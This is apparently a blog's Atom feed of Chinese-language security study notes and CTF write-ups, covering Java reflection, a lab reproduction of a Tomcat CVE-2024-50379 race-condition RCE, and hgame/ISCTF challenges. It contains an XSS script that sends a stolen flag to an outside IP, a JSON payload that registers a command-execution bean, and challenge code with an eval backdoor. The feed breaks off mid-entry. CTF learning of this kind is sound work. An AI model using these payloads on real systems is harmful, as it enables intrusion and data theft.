<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-07-17T08:59:44.435Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Yim1ngs</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java安全学习篇:1-反射</title>
    <link href="http://example.com/2025/07/17/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AF%87-1-%E5%8F%8D%E5%B0%84/"/>
    <id>http://example.com/2025/07/17/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AF%87-1-%E5%8F%8D%E5%B0%84/</id>
    <published>2025-07-17T23:54:20.000Z</published>
    <updated>2025-07-17T08:59:44.435Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java-安全学习篇-–-1-反射"><a href="#java-安全学习篇-–-1-反射" class="headerlink" title="java 安全学习篇 – 1 反射"></a>java 安全学习篇 – 1 反射</h1><blockquote><p>参考文章：知识星球 phithon 的文章（java 安全漫谈 - 01.反射篇(1)）</p><p><a href="https://javaguide.cn/java/jvm/classloader.html#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%BB%8B%E7%BB%8D">参考文章：javaguide</a></p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="反射："><a href="#反射：" class="headerlink" title="反射："></a>反射：</h3><p>java 反射可以动态获取类信息，对象通过反射获取类，类反射获取所有方法，包括私有，p 牛这里给动态特性一个定义，“<strong>⼀一段代码，改变其中的变量量，将会导致 这段代码产⽣生功能性的变化，我称之为动态特性</strong> ”</p><p>白嫖一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String className, String methodName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(className);<br>    clazz. getMethod(methodName).invoke(clazz.newInstance());<br> &#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>forName</code>  方法获取类此外还有别的方法，<code>obj.getClass()</code> 这个方法针对下文有类对应实例，通过实例获取对应类</p></li><li><p><code>getmethod</code>  方法获取类的方法</p></li><li><p><code>invoke</code>  方法执行函数</p></li><li><p><code>newInstance</code>  方法实例化类对象</p></li></ul><p>那我们想获取 Runtime 类，我们可以根据给到的实例，通过 <code>obj.getClass().forName(java.lang.Runtime)</code> 获取到 Runtime 类</p><p>forName 方法还有重载， <code>forName(String name, boolean initialize, ClassLoader loader)</code> 我们常用的实际上是</p><p><code>forName(classname, true, currentLoader)</code> 。第二个参数表示是否初始化，第三个参数是加载器，告诉虚拟机怎么加载</p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="java-加载器"><a href="#java-加载器" class="headerlink" title="java 加载器"></a>java 加载器</h3><p>涉及到的东西有点多，先粗略了解一下</p><p><strong>规则：</strong> 由于 java 采用延迟加载机制只有当程序需要使用某个类时，才会由类加载器加载该类。</p><p><strong>作用：</strong> 动态加载 java 类的字节码到虚拟机中，还可以加载 Java 应用所需的资源如文本、图像、配置文件、视频等等文件资源</p><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="initialize"><a href="#initialize" class="headerlink" title="initialize"></a>initialize</h3><p>我们知道这个参数负责类是否初始化，那类的初始化有什么用呢</p><p>白嫖一段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainPrint</span> &#123;<br>     &#123;<br>              System.out.printf(<span class="hljs-string">&quot;Empty block initial %s\n&quot;</span>, <span class="hljs-built_in">this</span>.getClass());<br>     &#125;<br>     <span class="hljs-keyword">static</span> &#123;<br>              System.out.printf(<span class="hljs-string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);<br>     &#125;<br>     <span class="hljs-keyword">public</span> <span class="hljs-title function_">TrainPrint</span><span class="hljs-params">()</span> &#123;<br>              System.out.printf(<span class="hljs-string">&quot;Initial %s\n&quot;</span>, <span class="hljs-built_in">this</span>.getClass());<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当这个类被初始化时，首先调用 static，然后调用父类构造方法，之后是{}，最后是自己的构造方法</p><p>根据这个特性，我们能够发现当 <code>forName()</code> 方法中的参数可控时，我们如果能将一个类放到被攻击机中并在里面 static 部分写入恶意代码，就能达到攻击目的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java-安全学习篇-–-1-反射&quot;&gt;&lt;a href=&quot;#java-安全学习篇-–-1-反射&quot; class=&quot;headerlink&quot; title=&quot;java 安全学习篇 – 1 反射&quot;&gt;&lt;/a&gt;java 安全学习篇 – 1 反射&lt;/h1&gt;&lt;blockquote&gt;
</summary>
      
    
    
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-50379-Tomcat-rce</title>
    <link href="http://example.com/2025/04/22/CVE-2024-50379-Tomcat-rce/"/>
    <id>http://example.com/2025/04/22/CVE-2024-50379-Tomcat-rce/</id>
    <published>2025-04-22T11:53:31.000Z</published>
    <updated>2025-04-23T08:42:30.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2024-50379-Tomcat-rce"><a href="#CVE-2024-50379-Tomcat-rce" class="headerlink" title="CVE-2024-50379-Tomcat-rce"></a>CVE-2024-50379-Tomcat-rce</h1><p>🤔 此漏洞有个前生 <strong>CVE-2017-12615</strong></p><p>在 Apache Tomcat 7.0.0 - 7.0.79 范围中，如果 web.xml 文件中，readonly 被设置成 false，我们就能用 put 方法(前提是没被禁用)上传一个精心打造的 jsp 文件直接来达到上传 webshell 的目的，简单粗暴</p><p><del>不是本次重点，不多述</del></p><p><strong>接下来是复现部分</strong> ：</p><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><p>首先我们需要 windows 环境，只有对大小不敏感的系统才能成功 rce</p><p>受影响的 Apache Tomcat 版本包括：</p><ul><li>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt; 11.0.2</li><li>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt; 10.1.34</li><li>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt; 9.0.98()</li></ul><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><p>下载有洞的版本后，我们需要先设置其中的 web.xml，在其中添加一个参数</p><p><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/Q7IabkGKyoBkmjxDtCycFrIXnbb.png"></p><p>将 readonly 指定为 false，这样才能让 defultServlet 允许上传文件到服务器</p><p>然后直接点击 startup.bat 启动，这里可能会编码错误，因为 windows 一般使用 GBK，我们需要在 logging.properties 文件中修改一下编码方式</p><p><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/VihvbHoT0ozf5gxsxaCcAap0ndf.png"></p><p>直接双击 startup.bat 启动</p><p><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/KNWZbwB32oKb2hxA04mcb4NjnJf.png"></p><p>卡在这也没事，直接访问本地的 8080 端口，即可</p><p>当我们尝试将一个 a.jsp 文件上传的时候，会发现 404 错误、</p><p>Tomcat 是禁止直接上传 <code>.jsp</code> 文件，后缀为小写的 <code>.jsp</code> 文件，当用户访问时，Tomcat 会交给 jspServlet 处理，而他并不处理 put 方法，导致上传失败。</p><p><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/XStAbYe3eoyCuCxD6Fuc1nEbnVh.png"></p><p>所以我们需要先让文件能被 put 上去，我们选择将文件改为 a.Jsp 这样处理他的就是 defaultsevrlet，文件可以顺利上传</p><p><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/GNHJb98HwoXVD9xxCtXc5819nad.png"></p><p>回应 201(即上传成功)，本地也能看见</p><p><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/EgD7bcMFdoAsstx9gUKcBVtUnZd.png"></p><p>（这时候应该可以写个 webshell，用蚁剑直接连上（没试过</p><p>但显然我们可以做的更多，接下来进行 rce</p><p>这时候，如果我们的文件中有精心构造的内容，我们如何让他执行呢</p><p>（本来我是使用 yakit 开启多个线程，一个不断 put .Jsp 文件，另一个不断 GET .jsp 文件来实现条件竞争达成 rce，但是一直不成功，这里使用佬佬的 poc 完成 rce</p><p>工具作者的 github 地址：<a href="https://github.com/SleepingBag945/CVE-2024-50379">https://github.com/SleepingBag945/CVE-2024-50379</a></p><p><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/DwhSb1Si4oA2JQx90elcyh8Pnoh.png"></p><p>当我们访问地址时，成功弹出了计算器</p><p><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/OuXEbYEqNomCOPxFdTicpfGinCh.png"></p><h3 id="工具源码分析："><a href="#工具源码分析：" class="headerlink" title="工具源码分析："></a>工具源码分析：</h3><p><del>自己看</del></p><p>主要在 main 函数中，通过开启三个线程，两个不断 put，一个 get，重复到成功</p><h3 id="原理解释："><a href="#原理解释：" class="headerlink" title="原理解释："></a>原理解释：</h3><p>对于 win 来说，a.Jsp 和 a.jsp 是一个文件（这个也可以研究 windows 找源码的方法知道为什么，这里不多解释。</p><p>我们要在 GET a.jsp 时让 JspServlet 执行这个文件，这里涉及 AbstractFileResourceSet 的 file 方法</p><pre><code>try &#123;    // JRE 方法    canPath = file.getCanonicalPath();    &#125; catch (IOException var6) &#123;    &#125;if (canPath != null &amp;&amp; canPath.startsWith(this.canonicalBase)) &#123;    String absPath = this.normalize(file.getAbsolutePath());    ....    if (!canPath.equals(absPath)) &#123;        if (!canPath.equalsIgnoreCase(absPath)) &#123;            this.logIgnoredSymlink(this.getRoot().getContext().getName(), absPath, canPath);&#125;            return null;        &#125; else &#123;            return file;         &#125; //大概就这些</code></pre><p>我们发现只有当 abspath&#x3D;canpath 时才会返回文件，也就是才会执行代码</p><p>其中 abs path 是用户输入的路径拼接处理后的本地绝对路径</p><p>其中 can path 是 JRE 类 WinNTFileSystem JNI&#x2F;cache 处理后得到的路径（如果缓存启用就会从其中获取</p><p>当我们 PUT 一个 a.Jsp 文件上去时，显然 abspath 和 canpath 都是 a.Jsp</p><p>当我们 GET a.jsp 时，如果我们已经 PUT a.Jsp，那么，abspath 会是 a.jsp canpath 会是 a.Jsp(从缓存中读)，那么不通过检测，就不会返回文件而如果我们 PUT 的 a.Jsp 还没落地 那么 abspath canpath 都会是 a.jsp 这样会返回文件</p><p>但很显然不 PUT 就不会有文件，而我们查看代码可以知道，这种检查不会只有一次而是重复好几次</p><pre><code>org.apache.catalina.webresources#getResourcecacheEntry.validateResource(useClassLoaderResources);//在 JspServlet 后续处理的过程中，会再次抵达 AbstractFileResourceSet file 方法//类似的过程会重复好几次</code></pre><p>在 JspServlet 读取文件前会经过很多次的检查</p><p>所以，我们要保证在它检查的时候，我们的 abspath canpath 要一直保持 a.jsp 而在返回文件前一刻，我们的 PUT a.Jsp 文件要刚好落地，这样才能完美执行，这里就是一个条件竞争</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2024-50379-Tomcat-rce&quot;&gt;&lt;a href=&quot;#CVE-2024-50379-Tomcat-rce&quot; class=&quot;headerlink&quot; title=&quot;CVE-2024-50379-Tomcat-rce&quot;&gt;&lt;/a&gt;CVE-2024-50</summary>
      
    
    
    
    
    <category term="CTF-CVE" scheme="http://example.com/tags/CTF-CVE/"/>
    
  </entry>
  
  <entry>
    <title>杂技！</title>
    <link href="http://example.com/2025/04/02/%E6%9D%82%E6%8A%80%EF%BC%81/"/>
    <id>http://example.com/2025/04/02/%E6%9D%82%E6%8A%80%EF%BC%81/</id>
    <published>2025-04-02T14:11:26.000Z</published>
    <updated>2025-04-02T08:10:49.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ISCTF："><a href="#ISCTF：" class="headerlink" title="ISCTF："></a>ISCTF：</h2><h4 id="千年樱："><a href="#千年樱：" class="headerlink" title="千年樱："></a>千年樱：</h4><p><strong>这道题令我印象深刻，主要在第三步</strong></p><?phpinclude "dir.php";highlight_file(__FILE_);function waf($str){    if(preg_match("/http|php|file|:|=|\/|\?/i", $str) ){    die('bad hacker!!!');}}$poc =$_POST['poc'];waf($poc);$filename = "php://filter/$poc/resource=/var/www/html/badChar.txt";$result = file_get_contents($filename);if($result === "sakura for ISCTF"){    echo "yes! master!";    eval($_POST['cmd']);}if($_GET['output'] == 114514 && !is_numeric($_GET['output'])){    var_dump($result);}    ?><p>参看源码我们可以得知这个程序会读取badchar这个文件，同时需要满足文件中的内容是sakura for ISCTF</p><p>我们查看文件中的内容，此处只需让output&#x3D;114514a即可绕过，而我们看到文件内容发现与sakura for ISCTF没关系</p><p>这里我们需要用到一个神奇小工具php_filter_chain_generator，他可以完全控制传递给 PHP 中 require 或 include 的参数，意思是我们可以直接传一个sakura for ISCTF上去   (<strong>他似乎可以直接达到rce的效果，有待考证</strong>)</p><p>我们使用工具构建出payload，直接使用是不行的，会显示文件中没用内容，这时候把前面第一个过滤器给他删了，<strong>mark一下，不知道原因捏</strong></p><p>还没完，此时构建出的字符串后面会有一大坨鬼东西，好像是php的标签，我们在payload最后面加一个<strong>string.strip_tags</strong>来去除，注意要使用|链接</p><p>此时就可以通过if了，附上开源工具的链接:<a href="https://github.com/synacktiv/php_filter_chain_generator">Synacktiv&#x2F;php_filter_chain_generator</a></p><h1 id="攻防世界杂谈"><a href="#攻防世界杂谈" class="headerlink" title="攻防世界杂谈"></a>攻防世界杂谈</h1><ul><li><p>robots协议</p></li><li><p>页面重定向，通过网络可以监控</p></li><li><p>ascii十进制编码(随波逐流一把梭)</p></li><li><p>burp根据payload进行爆破</p></li><li><p>index.php 后面加个s可以看到源码</p></li><li><p><strong>thinkphp</strong>各个版本的漏洞都有现成的payload，直接找</p></li></ul><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><ul><li>php执行反序列化<strong>unserialize()</strong> 会先查看有没有<strong>__wakeup</strong>方法，如果有会先执行 __<strong>wakeup</strong>方法</li></ul><p><strong>绕过方法</strong>：在序列化的字符串中说明的对象个数要比实际的对象个数<strong>要大</strong>，那么将不会执行<strong>__wakeup</strong>这个方法</p><h4 id="php文件包含-include"><a href="#php文件包含-include" class="headerlink" title="php文件包含(include)"></a>php文件包含(include)</h4><p><strong>php:&#x2F;&#x2F;伪协议:</strong> 构造php:&#x2F;&#x2F;input再post php代码<?php ...?>来达到rce</p><p><strong>data:&#x2F;&#x2F;伪协议:</strong> 构造data:&#x2F;&#x2F;text&#x2F;plain,<?php ....?>来达到rce</p><p>两个函数<strong>strstr</strong>和<strong>stristr</strong>这两个函数能搜索字符串中有没有特定字符，前者不区分大小写，后者区分</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ISCTF：&quot;&gt;&lt;a href=&quot;#ISCTF：&quot; class=&quot;headerlink&quot; title=&quot;ISCTF：&quot;&gt;&lt;/a&gt;ISCTF：&lt;/h2&gt;&lt;h4 id=&quot;千年樱：&quot;&gt;&lt;a href=&quot;#千年樱：&quot; class=&quot;headerlink&quot; title=&quot;千</summary>
      
    
    
    
    
    <category term="CTF-WP" scheme="http://example.com/tags/CTF-WP/"/>
    
  </entry>
  
  <entry>
    <title>hgame-SigninJava</title>
    <link href="http://example.com/2025/04/02/hgame-SigninJava/"/>
    <id>http://example.com/2025/04/02/hgame-SigninJava/</id>
    <published>2025-04-02T14:07:48.000Z</published>
    <updated>2025-04-02T08:10:17.930Z</updated>
    
    <content type="html"><![CDATA[<p>java，打开 jar 包可以看到代码，找到一个类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">@RequestMapping(&#123;&quot;/api&quot;&#125;)<br><br>@Controller<br><br>_/* loaded from: SigninJava.jar:BOOT-INF/classes/icu/Liki4/signin/controller/APIGatewayController.class */_<br><br>**public** **class** APIGatewayController &#123;<br><br>    @RequestMapping(value = &#123;&quot;/gateway&quot;&#125;, method = &#123;RequestMethod.POST&#125;)<br><br>    @ResponseBody<br><br>    **public** BaseResponse doPost(HttpServletRequest request) **throws** Exception &#123;<br><br>        **try** &#123;<br><br>            String body = IOUtils.toString(request.getReader());<br><br>            Map&lt;String, Object&gt; map = (Map) JSON.parseObject(body, Map.**class**);<br><br>            String beanName = (String) map.get(&quot;beanName&quot;);<br><br>            String methodName = (String) map.get(JsonEncoder.METHOD_NAME_ATTR_NAME);<br><br>            Map&lt;String, Object&gt; params = (Map) map.get(&quot;params&quot;);<br><br>            **if** (StrUtil.containsAnyIgnoreCase(beanName, &quot;flag&quot;)) &#123;<br><br>                **return** **new** BaseResponse(403, &quot;flagTestService offline&quot;, **null**);<br><br>            &#125;<br><br>            Object result = InvokeUtils.invokeBeanMethod(beanName, methodName, params);<br><br>            **return** **new** BaseResponse(200, **null**, result);<br><br>        &#125; **catch** (Exception e) &#123;<br><br>            **return** **new** BaseResponse(500, ((Throwable) Objects.requireNonNullElse(e.getCause(), e)).getMessage(), **null**);<br><br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>dopost 中接受数据，通过 InvokeUtils.invokeBeanMethod 调用指定的 Bean 方法</p><p>查看 hutool 的文档，发现其中有一个 RuntimeUtil，其中提供了命令执行方法，但是，只有注册到 Spring 容器中的 Bean 才能被 Spring 管理，并通过依赖注入的方式使用，而 <code>RuntimeUtil</code> 本身并不是一个 Spring Bean，因此需要通过动态注册将其加入 Spring 容器</p><p>因此，我们需要先调用 <code>cn.hutool.extra.spring.SpringUtil</code> 中的 <code>registerBean</code> 方法来向容器中添加 <code>RuntimeUtil</code> 实例名不可带有 flag</p><p>构造请求体</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;beanName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cn.hutool.extra.spring.SpringUtil&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;methodName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;registerBean&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;arg0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;execCmd&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;arg1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cn.hutool.core.util.RuntimeUtil&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>在调用 execCmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;beanName&quot;:&quot;execCmd&quot;,&quot;methodName&quot;:&quot;execForStr&quot;,<br>&quot;params&quot;:&#123;&quot;arg0&quot;:&quot;utf-8&quot;,&quot;arg1&quot;:[&quot;/readflag&quot;]&#125;&#125;<br></code></pre></td></tr></table></figure><p>这里&#x2F;flag 被加权限了，不能直接 cat</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;java，打开 jar 包可以看到代码，找到一个类&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span</summary>
      
    
    
    
    
    <category term="CTF-WP" scheme="http://example.com/tags/CTF-WP/"/>
    
  </entry>
  
  <entry>
    <title>Week2-hgame2025</title>
    <link href="http://example.com/2025/04/02/Week2-hgame2025/"/>
    <id>http://example.com/2025/04/02/Week2-hgame2025/</id>
    <published>2025-04-02T14:02:24.000Z</published>
    <updated>2025-04-23T10:28:44.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="Level-21096-HoneyPot"><a href="#Level-21096-HoneyPot" class="headerlink" title="Level 21096 HoneyPot"></a><strong>Level 21096 HoneyPot</strong></h3><p>源码给出了，发现其中的 bug，ImportData 函数未经严格过滤且直接执行 shell 命令操作</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/Nc8Fb0khNoo1k2xRrXFcq3LWnKh.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/Nc8Fb0khNoo1k2xRrXFcq3LWnKh.png"></p><p>发包执行命令，访问&#x2F;flag 得到 flag</p><h3 id="Level-21096-HoneyPot-Revenge"><a href="#Level-21096-HoneyPot-Revenge" class="headerlink" title="Level 21096 HoneyPot_Revenge"></a><strong>Level 21096 HoneyPot_Revenge</strong></h3><p>题目修了非预期，这里 21096 是 cve 编号，搜索并找到了出题人的 blog，根据出题人操作编译了一个恶意的 mysql，让服务器远程连上这个数据库，执行了藏在版本号里的&#x2F;writeflag 指令，访问&#x2F;flag 得到了 flag</p><p><a href="https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/">https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/</a></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="Computer-cleaner-plus"><a href="#Computer-cleaner-plus" class="headerlink" title="Computer cleaner plus"></a><strong>Computer cleaner plus</strong></h3><p>文件隐藏了，努力找找就行</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/TlO9b83PEoQliHxynhHcfHSFnMf.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/TlO9b83PEoQliHxynhHcfHSFnMf.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h3 id=&quot;Level-21096-HoneyPot&quot;&gt;&lt;a href=&quot;#Level-21096-HoneyPot&quot; class=&quot;</summary>
      
    
    
    
    
    <category term="CTF-WP" scheme="http://example.com/tags/CTF-WP/"/>
    
  </entry>
  
  <entry>
    <title>Week1-hgame2025</title>
    <link href="http://example.com/2025/04/02/Week1-hgame2025/"/>
    <id>http://example.com/2025/04/02/Week1-hgame2025/</id>
    <published>2025-04-02T13:11:07.000Z</published>
    <updated>2025-04-23T10:28:05.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><del>路边一条，一脚踹死</del></p><p>nc 那题直接连上就能执行 linux 指令</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/BdKCbLcDRotv9IxfD8kcvcqXnAf.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/BdKCbLcDRotv9IxfD8kcvcqXnAf.png" alt="BdKCbLcDRotv9IxfD8kcvcqXnAf"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>糖豆人，直接前端找到加分规则修改一个 10000 分</p><p>或者直接前端找到 gift 的内容，两假一真，base64 解码得 flag</p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>乐队，可以上传文件和改名，改名那可以路径穿越，于是构造恶意 ejs 文件覆盖原来的文件即可 rce</p><p>执行命令 env，刷新重加载即可得到 flag</p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>留言板，爆破密码 shallot 888888</p><p>留言板中的留言直接写入了 html 文件，执行 html 命令可以成功，于是构造恶意留言，服务器有&#x2F;admin,&#x2F;flag 路由，&#x2F;flag 路由显示只能由 admin 访问，（想了想还是粘个代码吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;<br>  <span class="hljs-comment">// 访问 /flag 页面并获取内容</span><br>  <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>    .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">text</span>())<br>    .<span class="hljs-title function_ invoke__">then</span>(flagContent =&gt; &#123;<br>      // 将 Flag 发送到攻击者服务器<br>      <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;https://82.157.129.178:80/?flag=&#x27;</span> + <span class="hljs-title function_ invoke__">encodeURIComponent</span>(flagContent));<br>    &#125;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>（应该是这个（<br>uridecode 一下就得到 flag 了</p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><strong>Level 38475 角落</strong></p><p>有 robots.txt，可知 app.py 位置，但是发现他不可读。</p><p>通过</p><p>RewriteEngine On</p><p>RewriteCond “%{HTTP_USER_AGENT}” “^L1nk&#x2F;“</p><p>RewriteRule “^&#x2F;admin&#x2F;(.*)$” “&#x2F;$1.html?secret&#x3D;todo”</p><p>发现用 admin 读取源码会被重指向，不能直接读</p><p><a href="https://httpd.apache.ac.cn/security/vulnerabilities_24.html">https://httpd.apache.ac.cn/security/vulnerabilities_24.html</a></p><p><a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/</a></p><p>大佬发现的漏洞，用？截断，于是我们可以看到源码</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/MdXhbEEqEoOIfLxoG2VcNm7en5f.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/MdXhbEEqEoOIfLxoG2VcNm7en5f.png" alt="MdXhbEEqEoOIfLxoG2VcNm7en5f"></p><p>只 waf 了{</p><p><del>无路可走</del> 有了：条件竞争，同时读和写（具体原理没搞懂）</p><p>用 bp 不断发送注入语句</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/MhAwbuHUOoYex0xYTD2cBVyxnqf.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/MhAwbuHUOoYex0xYTD2cBVyxnqf.png"></p><p>yakit 读取 read 页面</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/RvN6boaRcoxt0sxntP6cPGDPnNh.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/RvN6boaRcoxt0sxntP6cPGDPnNh.png"></p><p>得到 hgame{YOU-Find-ThE-k3y_t0-rRrac3-oUUUUt2a76ddc}</p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p><strong>Level 25 双面人派对</strong></p><p>给了一个 main，<del>不知道是啥</del> 好像是 minio 的管理代码编译后的东东，不是很清楚</p><p>upx 脱壳后发现其中有个 minio 的项目，找到其中的 key</p><p class='item-img' data-src='https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/X2UAbNF6FoHeuKxbyxTclz8CnFb.png'><img src="https://raw.githubusercontent.com/Yim1ngs/images/refs/heads/main/static/X2UAbNF6FoHeuKxbyxTclz8CnFb.png"></p><p>使用 mc 连接到另一个靶机上的 minio</p><p class='item-img' 